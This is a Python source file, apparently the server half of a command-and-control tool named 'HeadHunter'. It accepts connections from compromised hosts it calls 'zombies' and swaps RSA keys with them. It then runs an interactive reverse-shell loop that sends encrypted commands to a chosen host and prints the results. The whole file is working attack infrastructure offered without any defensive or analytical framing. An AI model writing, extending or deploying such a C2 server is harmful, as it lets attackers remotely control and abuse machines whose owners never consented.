import socket
import threading
import sys 
import time
import rsa
from dataclasses import dataclass

print("Generating encryption keys...")
# Generate public and private RSA keys for the server
public_key, private_key = rsa.newkeys(2048)
public_partner = [None for i in range(100)]
print("Done!\n")

@dataclass
class Zombie:
    c: int
    addr: tuple
    public_partner: str

zombies = []

# Continuously accept incoming zombie connectios
def acceptor(s):
		
    global zombies

    while True:
        
        zombie = Zombie(0, (), "")

        zombie.c, zombie.addr = s.accept()
        zombie.c.send(public_key.save_pkcs1("PEM"))
        zombie.public_partner = rsa.PublicKey.load_pkcs1(zombie.c.recv(2048))
        print("\ngot connection from " + str(zombie.addr) + " starting session. Type any command or press enter to return to previous session\n")
        zombies.append(zombie)	
		
# Initial master socket configuration, socket list allocation, and initial client connection handshake
def listen(port):
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", port))
	s.listen(100);global zombies

	print("\nListening on port " + str(port) + " for connections");zombie = Zombie(0, (), "")
    
	zombie.c, zombie.addr = s.accept()
	zombie.c.send(public_key.save_pkcs1("PEM"))
	zombie.public_partner = rsa.PublicKey.load_pkcs1(zombie.c.recv(2048))

	print("got connection from " + str(zombie.addr) + ". Starting reverse shell session. Type \"exit\" to return to the HeadHunter interactive shell\n");zombies.append(zombie)

	acceptorThread = threading.Thread(target=acceptor, args=(s,), daemon=True)
	acceptorThread.start()
	global activefd
	global activeaddr
	activefd = zombie.c
	activeaddr = zombie.addr
	zombiepubkey = zombie.public_partner
	control(activefd, zombiepubkey)

# Control session for selected zombies
def control(zombie, zombiepubkey):

    try:
        while True:	

            d = input("Zombie/> ")

            if(d == "exit"):
                break;
            
            d += "\n"
            zombie.send(rsa.encrypt(d.encode(), zombiepubkey))

            cmd = rsa.decrypt(zombie.recv(15024), private_key).decode()
            sys.stdout.write(cmd)
			
    except Exception as e:
        print("Error: " + str(e))
